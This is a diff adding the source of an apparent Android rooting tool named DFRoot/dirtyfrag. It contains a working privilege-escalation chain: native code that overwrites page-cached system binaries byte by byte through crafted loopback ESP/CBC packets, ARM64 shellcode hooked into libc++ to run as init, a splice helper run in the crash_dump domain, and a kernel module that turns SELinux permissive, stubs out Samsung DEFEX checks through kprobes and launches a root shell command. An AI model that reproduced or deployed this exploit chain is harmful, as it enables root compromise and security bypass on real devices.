+        setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+        struct sockaddr_in src = {
+            .sin_family = AF_INET,
+            .sin_port   = htons((uint16_t)g_sender_port),
+            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+        };
+        if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
+            REPORTLN("bind port %d failed: %s", g_sender_port, strerror(errno));
+        struct sockaddr_in dst = {
+            .sin_family = AF_INET,
+            .sin_port   = htons((uint16_t)g_encap_port),
+            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
+        };
+        if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
+            REPORTLN("connect failed: %s", strerror(errno));
+            close(sk_send); return -1;
+        }
+    }
+
+    int file_fd = -1;
+    if (!use_helper) {
+        file_fd = open(path, O_RDONLY);
+        if (file_fd < 0) {
+            REPORTLN("open %s failed: %s", path, strerror(errno));
+            close(sk_send); return -1;
+        }
+    }
+
+    int rc = 0;
+    for (size_t i = 0; i < len / 16; i++) {
+        off_t off = (off_t)(foff + i * 16);
+        uint8_t old_content[16] = {0};
+
+        if (use_helper) {
+            if (read_vendor_content(off, old_content, reporter) < 0) {
+                rc = -1; break;
+            }
+        } else {
+            if (pread(file_fd, old_content, 16, off) != 16) {
+                REPORTLN("pread at 0x%lx failed: %s", (long)off, strerror(errno));
+                rc = -1; break;
+            }
+        }
+
+        uint8_t desired[16] = {0};
+        memcpy(desired, payload + i * 16, 16);
+
+        uint8_t iv[16];
+        compute_iv(old_content, desired, iv);
+
+        if (do_one_write_cbc(sk_send, file_fd, off, iv, old_content, use_helper, reporter) < 0) {
+            REPORTLN("write #%zu at 0x%lx failed", i, (long)off);
+            rc = -1; break;
+        }
+        if (i % 32 == 0)
+            REPORTLN("%zu ...", i * 16);
+    }
+
+    if (!use_helper) close(file_fd);
+    close(sk_send);
+    if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx", len, path, foff);
+    return rc;
+}
+
+/* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */
+
+extern char libcxx_start[];
+extern char libcxx_data[];
+extern uint32_t libcxx_len;
+extern char libcxx_first_inst_copy[];
+extern uint32_t libcxx_ko_target_off;
+extern uint32_t libcxx_soft_reboot_off;
+
+int find_hook_target(const char *lib, const char *sym,
+                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
+                     struct Reporter *reporter);
+
+asm(
+    ".section .rodata\n"
+    ".global dirtyfrag_ko_12_5_10_start\n.global dirtyfrag_ko_12_5_10_end\n"
+    "dirtyfrag_ko_12_5_10_start:\n.incbin \"ko/dirtyfrag-android12-5.10.ko\"\ndirtyfrag_ko_12_5_10_end:\n"
+    ".global dirtyfrag_ko_13_5_10_start\n.global dirtyfrag_ko_13_5_10_end\n"
+    "dirtyfrag_ko_13_5_10_start:\n.incbin \"ko/dirtyfrag-android13-5.10.ko\"\ndirtyfrag_ko_13_5_10_end:\n"
+    ".global dirtyfrag_ko_13_5_15_start\n.global dirtyfrag_ko_13_5_15_end\n"
+    "dirtyfrag_ko_13_5_15_start:\n.incbin \"ko/dirtyfrag-android13-5.15.ko\"\ndirtyfrag_ko_13_5_15_end:\n"
+    ".global dirtyfrag_ko_14_5_15_start\n.global dirtyfrag_ko_14_5_15_end\n"
+    "dirtyfrag_ko_14_5_15_start:\n.incbin \"ko/dirtyfrag-android14-5.15.ko\"\ndirtyfrag_ko_14_5_15_end:\n"
+    ".global dirtyfrag_ko_15_6_6_start\n.global dirtyfrag_ko_15_6_6_end\n"
+    "dirtyfrag_ko_15_6_6_start:\n.incbin \"ko/dirtyfrag-android15-6.6.ko\"\ndirtyfrag_ko_15_6_6_end:\n"
+    ".global dirtyfrag_ko_16_6_12_start\n.global dirtyfrag_ko_16_6_12_end\n"
+    "dirtyfrag_ko_16_6_12_start:\n.incbin \"ko/dirtyfrag-android16-6.12.ko\"\ndirtyfrag_ko_16_6_12_end:\n"
+    ".global dirtyfrag_ko_17_6_18_start\n.global dirtyfrag_ko_17_6_18_end\n"
+    "dirtyfrag_ko_17_6_18_start:\n.incbin \"ko/dirtyfrag-android17-6.18.ko\"\ndirtyfrag_ko_17_6_18_end:\n"
+);
+
+asm(
+    ".section .rodata\n"
+    ".global splice_helper_start\n.global splice_helper_end\n"
+    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
+);
+
+extern char dirtyfrag_ko_12_5_10_start[], dirtyfrag_ko_12_5_10_end[];
+extern char dirtyfrag_ko_13_5_10_start[], dirtyfrag_ko_13_5_10_end[];
+extern char dirtyfrag_ko_13_5_15_start[], dirtyfrag_ko_13_5_15_end[];
+extern char dirtyfrag_ko_14_5_15_start[], dirtyfrag_ko_14_5_15_end[];
+extern char dirtyfrag_ko_15_6_6_start[],  dirtyfrag_ko_15_6_6_end[];
+extern char dirtyfrag_ko_16_6_12_start[], dirtyfrag_ko_16_6_12_end[];
+extern char dirtyfrag_ko_17_6_18_start[], dirtyfrag_ko_17_6_18_end[];
+extern char splice_helper_start[], splice_helper_end[];
+
+struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };
+
+static const struct KoImage *select_ko_image(int andr, int major, int minor) {
+    static const struct KoImage imgs[] = {
+        {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
+        {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
+        {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
+        {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
+        {15, 6,  6, dirtyfrag_ko_15_6_6_start,  dirtyfrag_ko_15_6_6_end},
+        {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
+        {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
+    };
+    const struct KoImage *fb = NULL;
+    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
+        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
+        if (imgs[i].android_release == andr) return &imgs[i];
+        if (!fb) fb = &imgs[i];
+    }
+    return fb;
+}
+
+static int read_device_versions(int *andr, int *major, int *minor) {
+    struct utsname u;
+    if (uname(&u) != 0) return -1;
+    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
+    const char *m = strstr(u.release, "android");
+    if (!m) return -1;
+    *andr = atoi(m + 7);
+    return (*andr > 0) ? 0 : -1;
+}
+
+/* Pad payload to a multiple of 16 bytes in a heap buffer.
+ * Caller must free() the returned pointer.
+ */
+static char *pad16(const char *data, size_t len, size_t *out_len) {
+    size_t padded = (len + 15) & ~(size_t)15;
+    char *buf = calloc(1, padded);
+    if (buf) memcpy(buf, data, len);
+    *out_len = padded;
+    return buf;
+}
+
+
+static int patch_ko(struct Reporter *reporter) {
+    /* pick KO image */
+    int andr = 0, major = 0, minor = 0;
+    if (read_device_versions(&andr, &major, &minor) != 0) {
+        REPORTLN("Unable to match kernel version - possibly unsupported Non-GKI device"); return 1;
+    }
+    const struct KoImage *ko = select_ko_image(andr, major, minor);
+    if (!ko) {
+        REPORTLN("unsupported kernel %d.%d android %d", major, minor, andr); return 1;
+    }
+    REPORTLN("* ko android%d-%d.%d (%d bytes)",
+             ko->android_release, ko->kver_major, ko->kver_minor,
+             (int)(ko->end - ko->start));
+
+    /* patch #1: write splicehelper into crash_dump64 page cache.
+     * After this, exec'ing kCrashDump runs our splicehelper in crash_dump
+     * SELinux domain (exec transition on the path label) and can open vendor files. */
+    size_t sh_len_padded;
+    char *sh_buf = pad16(splice_helper_start,
+                         (size_t)(splice_helper_end - splice_helper_start),
+                         &sh_len_padded);
+    if (!sh_buf) return -1;
+    REPORTLN("* patch #1 (crash_dump64 â† splicehelper, %zu bytes)", sh_len_padded);
+    int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
+    if (ret) { free(sh_buf); REPORTLN("patch #1 failed: %d", ret); return ret; }
+
+    // Verify patch #1 actually landed in the page cache.
+    {
+        uint8_t verify[16];
+        int vfd = open(kCrashDump, O_RDONLY);
+        if (vfd >= 0) {
+            ssize_t n = pread(vfd, verify, 16, 16);
+            close(vfd);
+            if (n == 16 && memcmp(verify, sh_buf + 16, 16) != 0) {
+                REPORTLN("patch #1 verify FAILED: page cache not modified");
+                free(sh_buf);
+                return -1;
+            }
+            REPORTLN("patch #1 verify OK");
+        }
+    }
+    free(sh_buf);
+
+    size_t ko_len_padded;
+    char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
+    if (!ko_buf) return -1;
+
+    /* patch #2: write KO into vendor lib via crash_dump bridge */
+    REPORTLN("* patch #2 (%s â† dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
+    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
+    free(ko_buf);
+    if (ret) REPORTLN("patch #2 failed: %d", ret);
+    return ret;
+}
+
+static int patch_hook(const char *lib, const char *sym,
+                      char *stage_data, uint32_t stage_len, char *stage_start,
+                      char *first_inst_copy,
+                      struct Reporter *reporter, struct PatchRestore *restore) {
+    uint64_t hook_off, shell_off; uint32_t first_insn;
+    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, reporter)) {
+        REPORTLN("find %s hook target failed", lib); return 1;
+    }
+    REPORTLN("%s hook=0x%lx shell=0x%lx len=%u", lib, hook_off, shell_off, stage_len);
+
+    const uint32_t BRANCH = 0x14000000;
+    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
+    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
+
+    if (first_insn == hook_insn) {
+        REPORTLN("%s already hooked", lib); return 0;
+    }
+    uint32_t jmpback = BRANCH |
+        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
+    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
+    *(uint32_t *)&first_inst_copy[0] = first_insn;
+
+    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
+    if (!buf) return -1;
+
+    if (restore) {
+        restore->lib = lib;
+        restore->shell_off = shell_off;
+        restore->shell_padded = padded;
+        restore->shell_orig = malloc(padded);
+        if (restore->shell_orig) {
+            int rfd = open(lib, O_RDONLY);
+            if (rfd < 0 || pread(rfd, restore->shell_orig, padded, (off_t)shell_off) != (ssize_t)padded) {
+                free(restore->shell_orig); restore->shell_orig = NULL;
+            }
+            if (rfd >= 0) close(rfd);
+        }
+    }
+
+    REPORTLN("* patching %s shellcode", lib);
+    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, reporter);
+    free(buf);
+    if (ret) { REPORTLN("* patching %s shellcode failed", lib); return ret; }
+
+    {
+        uint64_t aligned = hook_off & ~(uint64_t)15;
+        int pos = (int)(hook_off & 15);
+        uint8_t blk[16];
+        int fd = open(lib, O_RDONLY);
+        if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
+            REPORTLN("pread %s trampoline block failed", lib); if (fd >= 0) close(fd); return -1;
+        }
+        close(fd);
+        if (restore) {
+            restore->tramp_aligned = aligned;
+            memcpy(restore->tramp_orig, blk, 16);
+            restore->valid = 1;
+        }
+        blk[pos+0] = (uint8_t)(hook_insn      );
+        blk[pos+1] = (uint8_t)(hook_insn >>  8);
+        blk[pos+2] = (uint8_t)(hook_insn >> 16);
+        blk[pos+3] = (uint8_t)(hook_insn >> 24);
+        REPORTLN("* patching %s trampoline at 0x%lx", lib, hook_off);
+        ret = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
+    }
+    return ret;
+}
+
+static void restore_hook(struct PatchRestore *r, struct Reporter *reporter) {
+    if (!r->valid) return;
+    REPORTLN("* restore trampoline in %s", r->lib);
+    patch_file_cbc(r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0, reporter);
+    if (r->shell_orig) {
+        REPORTLN("* restore shellcode in %s", r->lib);
+        patch_file_cbc(r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0, reporter);
+    }
+}
+
+static void fadvise_drop(const char *path, struct Reporter *reporter) {
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) { REPORTLN("fadvise_drop open %s failed: %s", path, strerror(errno)); return; }
+    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
+    close(fd);
+    REPORTLN("* cache dropped: %s", path);
+}
+
+static int createOrphanProcess(struct Reporter *reporter) {
+    int pid = fork();
+    if (pid < 0) { REPORTLN("fork failed: %s", strerror(errno)); return -1; }
+    if (pid == 0) {
+        int pid2 = fork();
+        if (pid2 == 0) { sleep(1); _exit(0); }
+        _exit(0);
+    }
+    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
+    return 0;
+}
+
+static int has_marker(const char *p) { return access(p, F_OK) == 0; }
+
+JNIEXPORT jint JNICALL
+Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
+                                               jobject reporter_obj,
+                                               jstring koTargetPath,
+                                               jint encapPort, jint spi,
+                                               jbyteArray aesCbcKey,
+                                               jbyteArray hmacKey, jint icvLen,
+                                               jint senderPort,
+                                               jboolean softReboot) {
+    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
+
+    g_encap_port  = (int)encapPort;
+    g_sender_port = (int)senderPort;
+    g_spi         = (uint32_t)spi;
+    g_seq         = 1;
+    g_icv_len     = (int)icvLen;
+
+    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
+    memcpy(g_aes_key, kb, 32);
+    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
+
+    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
+    memcpy(g_hmac_key, hb, 32);
+    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
+
+    libcxx_ko_target   = libcxx_data + libcxx_ko_target_off;
+    const char *p = (*env)->GetStringUTFChars(env, koTargetPath, NULL);
+    if (p) {
+        strncpy(libcxx_ko_target, p, 63);
+        libcxx_ko_target[63] = '\0';
+        (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
+    }
+    libcxx_soft_reboot = (uint8_t *)(libcxx_data + libcxx_soft_reboot_off);
+    *libcxx_soft_reboot = softReboot ? 1 : 0;
+
+    struct PatchRestore libcxx_r = {0};
+
+    int rc = 3;
+    if (patch_ko(reporter)) goto done;
+    if (patch_hook("/system/lib64/libc++.so",
+                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
+                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                   reporter, &libcxx_r)) goto done;
+
+    rc = 2;
+    usleep(500000);
+    REPORTLN("* triggering...");
+    createOrphanProcess(reporter);
+
+    static const struct {
+        const char *path;
+        const char *msg;
+        int         rc;
+    } markers[] = {
+        { "/dev/df",   "libc++: mutex acquired, loading custom module", -1 },
+        { "/dev/dfm0", "***SUCCESS***",                        0 },
+        { "/dev/dfm1", "***FAILED***: ksud exited with error", 1 },
+    };
+    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
+
+    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
+        usleep(10000);
+        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
+            if (!seen[j] && has_marker(markers[j].path)) {
+                seen[j] = 1;
+                REPORTLN("%s", markers[j].msg);
+                if (markers[j].rc >= 0) {
+                    rc = markers[j].rc;
+                    goto done;
+                }
+            }
+        }
+    }
+    REPORTLN("***FAILED***: check logs");
+done:
+    if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
+    REPORTLN("\n=== cleanup ===");
+    restore_hook(&libcxx_r, reporter);
+    fadvise_drop(kCrashDump, reporter);
+    free(libcxx_r.shell_orig);
+    return rc;
+}
+
+============================================================
+
+FILE: ./app/src/main/jni/splicehelper.c
+============================================================
+#include <syscall.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+// argv[0] = program name
+// argv[1] = file offset (decimal string)
+// argv[2] = file path
+// argv[3] = optional "r" â€” read mode: write 16 bytes of file content to fd 0 (OUT_FD)
+//           if absent â€” splice mode: splice 16 bytes of file page into fd 1 (PIPE_FD)
+
+#define OUT_FD  0
+#define PIPE_FD 1
+
+__attribute__((naked)) static long mysyscall1(unsigned long arg0, unsigned long nr) {
+    asm volatile("mov x8, x1\nsvc 0\nret\n":::"x8");
+}
+
+__attribute__((naked)) static long mysyscall3(
+    unsigned long a0, unsigned long a1, unsigned long a2, unsigned long nr) {
+    asm volatile("mov x8, x3\nsvc 0\nret\n":::"x8");
+}
+
+__attribute__((naked)) static long mysyscall6(
+    unsigned long a0, unsigned long a1, unsigned long a2,
+    unsigned long a3, unsigned long a4, unsigned long a5, unsigned long nr) {
+    asm volatile("mov x8, x6\nsvc 0\nret\n":::"x8");
+}
+
+static unsigned long parse_int(char *s) {
+    unsigned long val = 0;
+    while (*s) { val = val * 10 + (unsigned long)(*s - '0'); s++; }
+    return val;
+}
+
+static int streq(const char *a, const char *b) {
+    while (*a && *b && *a == *b) { a++; b++; }
+    return *a == *b;
+}
+
+void start_c(void *argblock) {
+    int argc = (int)*(long *)argblock;
+    char **argv = (char **)argblock + 1;
+
+    off64_t off = (off64_t)parse_int(argv[1]);
+    char *target = argv[2];
+    char *mode = (argc >= 4) ? argv[3] : (char *)0;
+
+    int file_fd = (int)mysyscall3(
+        (unsigned long)AT_FDCWD,
+        (unsigned long)target,
+        (unsigned long)O_RDONLY,
+        __NR_openat);
+    if (file_fd < 0)
+        mysyscall1(1, __NR_exit_group);
+
+    if (mode && streq(mode, "r")) {
+        /* Read mode: lseek to offset, read 16 bytes, write to OUT_FD */
+        /* Exit codes: 0=ok, 1=read<16, 2=write<16, 3=OUT_FD not a pipe (fd sanitized) */
+        mysyscall3((unsigned long)file_fd, (unsigned long)off, SEEK_SET, __NR_lseek);
+        unsigned char buf[16];
+        long n = mysyscall3((unsigned long)file_fd, (unsigned long)buf, 16, __NR_read);
+        if (n != 16)
+            mysyscall1(1, __NR_exit_group);
+        if (mysyscall3(OUT_FD, 0, SEEK_CUR, __NR_lseek) != (long)-29L) /* ESPIPE: fd is a pipe */
+            mysyscall1(3, __NR_exit_group);
+        long w = mysyscall3(OUT_FD, (unsigned long)buf, 16, __NR_write);
+        mysyscall1((unsigned long)(w == 16 ? 0 : 2), __NR_exit_group);
+    }
+
+    /* Splice mode: splice 16-byte page into PIPE_FD */
+    long ret = mysyscall6(
+        (unsigned long)file_fd,
+        (unsigned long)&off,
+        PIPE_FD,
+        (unsigned long)NULL,
+        16,
+        SPLICE_F_MOVE,
+        __NR_splice);
+    mysyscall1((unsigned long)(ret == 16 ? 0 : 1), __NR_exit_group);
+}
+
+__attribute__((naked)) void _start() {
+    asm(".extern start_c\nmov x0, sp\nb start_c\n");
+}
+
+============================================================
+
+FILE: ./dirtyfrag-lkm/dirtyfrag.c
+============================================================
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/kmod.h>
+#include <linux/kprobes.h>
+#include <linux/module.h>
+#include <linux/ptrace.h>
+
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("DFRoot LKM");
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
+                             void *init, void *cleanup, void *data);
+typedef int (*umh_exec_t)(void *info, int wait);
+
+static int soft_reboot;
+module_param(soft_reboot, int, 0);
+
+static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs)
+{
+    (void)p;
+    regs->regs[0] = 0;         /* x0 = DEFEX_ALLOW */
+    regs->pc = regs->regs[30]; /* skip body: return to caller */
+    return 1;
+}
+
+static int __nocfi __init dirtyfrag_init(void)
+{
+    kallsyms_lookup_name_t get_addr;
+    umh_setup_t umh_setup;
+    umh_exec_t  umh_exec;
+    bool *selinux_state;
+    struct kprobe kln_kp;
+    struct kprobe defex_kp;
+    struct kprobe umh_kp;
+    void *info;
+    int ret;
+
+    static const char sh[]   = "/system/bin/sh";
+    static const char ksud[] = "/data/user_de/0/df.root/ksud";
+    static char cmd[256];
+    static char *envp[] = { "PATH=/system/bin", NULL };
+    static char *argv[] = { (char *)sh, "-c", cmd, NULL };
+    snprintf(cmd, sizeof(cmd),
+             "%s late-load --package-name me.weishu.kernelsu --ro-partitions%s"
+             " && touch /dev/dfm0 || touch /dev/dfm1",
+             ksud, soft_reboot ? " --soft-reboot" : "");
+
+    kln_kp = (struct kprobe){ .symbol_name = "kallsyms_lookup_name" };
+    if (register_kprobe(&kln_kp) < 0) {
+        pr_err("dfroot: kallsyms_lookup_name not found\n");
+        return -EINVAL;
+    }
+    get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
+    unregister_kprobe(&kln_kp);
+
+    selinux_state = (bool *)get_addr("selinux_state");
+    if (!selinux_state) {
+        pr_err("dfroot: selinux_state not found\n");
+        return -EINVAL;
+    }
+    WRITE_ONCE(*selinux_state, false);
+    pr_info("dfroot: selinux_state permissive\n");
+
+    defex_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_enforce"),
+                                .pre_handler = defex_pre_handler };
+    if (register_kprobe(&defex_kp) < 0)
+        pr_err("dfroot: task_defex_enforce not found\n");
+    else
+        pr_info("dfroot: task_defex_enforce hooked\n");
+
+    umh_kp = (struct kprobe){ .addr = (kprobe_opcode_t *)get_addr("task_defex_user_exec"),
+                              .pre_handler = defex_pre_handler };
+    if (register_kprobe(&umh_kp) < 0)
+        pr_err("dfroot: task_defex_user_exec not found\n");
+    else
+        pr_info("dfroot: task_defex_user_exec hooked\n");
+
+    umh_setup = (umh_setup_t)get_addr("call_usermodehelper_setup");
+    umh_exec  = (umh_exec_t)get_addr("call_usermodehelper_exec");
+    if (!umh_setup || !umh_exec) {
+        pr_err("dfroot: usermodehelper symbols missing (setup=%px exec=%px)\n",
+               umh_setup, umh_exec);
+        return -EINVAL;
+    }
+
+    info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
+    if (!info) {
+        pr_err("dfroot: usermodehelper_setup: returned NULL\n");
+        return -EINVAL;
+    }
+    /* bypass CONFIG_STATIC_USERMODEHELPER_PATH="" overriding path to "" */
+    ((struct subprocess_info *)info)->path = sh;
+
+    ret = umh_exec(info, UMH_WAIT_PROC);
+    pr_info("dfroot: usermodehelper_exec(%s) returned %d\n", ksud, ret);
+
+    if (defex_kp.addr) unregister_kprobe(&defex_kp);
+    if (umh_kp.addr)   unregister_kprobe(&umh_kp);
+    return -E2BIG; /* return any error to unload module */
+}
+
+/* no module_exit: we never unload; saves .exit sections */
+module_init(dirtyfrag_init);
+
+============================================================
+
+FILE: ./app/src/main/jni/libcxx.S
+============================================================
+    .arch armv8-a
+
+    .include "include.inc"
+
+    .global libcxx_start
+    .global libcxx_data
+    .global libcxx_len
+    .global libcxx_first_inst_copy
+    .data
+
+
+libcxx_data:
+
+mutex_file:
+    .asciz "/dev/df"
+selinux_ctx:
+    .asciz "u:r:vendor_modprobe:s0"
+selinux_ctx_end:
+attr_exec:
+    .asciz "/proc/self/attr/exec"
+exe_path:
+    .asciz "/vendor/bin/insmod"
+ko_target:
+    .ascii "/vendor/lib64/libbinderdebug.so\0"
+    .skip 32, 0                             /* pad to 64 bytes â€” longest candidate path */
+param_soft_reboot:
+    .asciz "soft_reboot=1"
+
+    .balign 4
+    .global libcxx_ko_target_off
+libcxx_ko_target_off:
+    .int ko_target - libcxx_data
+    .global libcxx_soft_reboot_off
+libcxx_soft_reboot_off:
+    .int soft_reboot_flag - libcxx_data
+soft_reboot_flag:
+    .byte 0
+
+    .align 4
+
+libcxx_start:
+    stp x0, x1, [sp, #-16]!
+    stp x2, x3, [sp, #-16]!
+    stp x4, x5, [sp, #-16]!
+    stp x6, x7, [sp, #-16]!
+    stp x8, x9, [sp, #-16]!
+    stp x26, x27, [sp, #-16]!
+    stp x28, x29, [sp, #-16]!
+    str x30, [sp, #-16]!
+
+    // Detect root uid = 0
+    mov     x8, SYS_getuid
+    svc     0
+    cbnz    w0, return
+
+    // Detect init tid = 1
+    // We need thread 1 to use the default namespace
+    mov     x8, SYS_gettid
+    svc     0
+    cmp     w0, 1
+    bne     return
+
+    // To avoid later call of hook to execute payload, create file as mutex.
+    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
+    mov     x0, -100
+    adr     x1, mutex_file
+    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
+    mov     x3, xzr
+    mov     x8, #SYS_openat
+    svc     0
+
+    // return if fail to open (file exist)
+    tbnz    w0, #31, return
+
+    sub     sp, sp, 16
+
+    // syscall(SYS_gettid);
+    mov     x8, SYS_gettid
+    svc     0
+    str     w0, [sp, 8]
+
+    // clone(CLONE_CHILD_SETTID   |
+    //       CLONE_CHILD_CLEARTID |
+    //       SIGCHLD, 0, NULL, NULL, &ctid)
+    mov     x8, SYS_clone
+    add     x4, sp, 8           // ctid
+    mov     x3, xzr              // newtls
+    mov     x2, xzr              // ptid
+    mov     x1, xzr              // stack
+    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
+    svc     0
+    str     w0, [sp, 8]         // save id
+    add     sp, sp, 16
+
+    cbnz    w0, return          // parent returns to init
+
+    // â”€â”€ worker child â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    sub     sp, sp, 32
+
+    // Fork grandchild: set SELinux exec context â†’ execve insmod
+    mov     x0, #SIGCHLD
+    mov     x1, xzr
+    mov     x2, xzr
+    mov     x3, xzr
+    mov     x4, xzr
+    mov     x8, #SYS_clone
+    svc     0
+    str     w0, [sp, 24]
+    cbnz    w0, myexit
+
+    // â”€â”€ grandchild: insmod the KO as vendor_modprobe â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+    // open /proc/self/attr/exec
+    mov     x0, -100
+    adr     x1, attr_exec
+    movl    x2, (O_WRONLY|O_CLOEXEC)
+    mov     x8, #SYS_openat
+    svc     0
+    adr     x1, selinux_ctx
+    mov     x2, selinux_ctx_end - selinux_ctx
+    mov     x8, #SYS_write
+    svc     0
+
+    // execve("/vendor/bin/insmod", [exe_path, ko_target, ["soft_reboot=1",] NULL], NULL)
+    adr     x1, exe_path
+    str     x1, [sp]
+    adr     x1, ko_target
+    str     x1, [sp, 8]
+    adr     x9, soft_reboot_flag
+    ldrb    w9, [x9]
+    cbz     w9, insmod_no_sr
+    adr     x1, param_soft_reboot
+    str     x1, [sp, 16]
+    str     xzr, [sp, 24]
+    b       do_insmod
+insmod_no_sr:
+    str     xzr, [sp, 16]
+do_insmod:
+    adr     x0, exe_path
+    mov     x1, sp
+    mov     x2, xzr
+    mov     x8, #SYS_execve
+    svc     0
+
+    b       myexit
+
+myexit:
+    mov     x0, #1
+    mov     x8, #SYS_exit
+    svc     0
+
+return:
+    ldr x30, [sp], #16
+    ldp x28, x29, [sp], #16
+    ldp x26, x27, [sp], #16
+    ldp x8, x9, [sp], #16
+    ldp x6, x7, [sp], #16
+    ldp x4, x5, [sp], #16
+    ldp x2, x3, [sp], #16
+    ldp x0, x1, [sp], #16
+libcxx_first_inst_copy:
+    stp     x29, x30, [sp, #-32]!
+    b       end
+end:
+
+libcxx_end:
+libcxx_len:
+    .word libcxx_end - libcxx_data
+
+============================================================
+
+FILE: ./app/src/main/jni/include.inc
+============================================================
+ /**
+  Copyright Â© 2018 Odzhan. All Rights Reserved.
+
+  Redistribution and use in source and binary forms, with or without
+  modification, are permitted provided that the following conditions are
+  met:
+
+  1. Redistributions of source code must retain the above copyright
+  notice, this list of conditions and the following disclaimer.
+
+  2. Redistributions in binary form must reproduce the above copyright
+  notice, this list of conditions and the following disclaimer in the
+  documentation and/or other materials provided with the distribution.
+
+  3. The name of the author may not be used to endorse or promote products
+  derived from this software without specific prior written permission.
+
+  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
+  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
+  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
+  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+  POSSIBILITY OF SUCH DAMAGE. */
+
+  // symbolic constants for Linux/AArch64
+
+  .equ BINSH,                0x0068732F6E69622F
+
+  .equ BUFSIZ,               64
+  .equ NULL,                  0
+  .equ SIGCHLD,              17
+
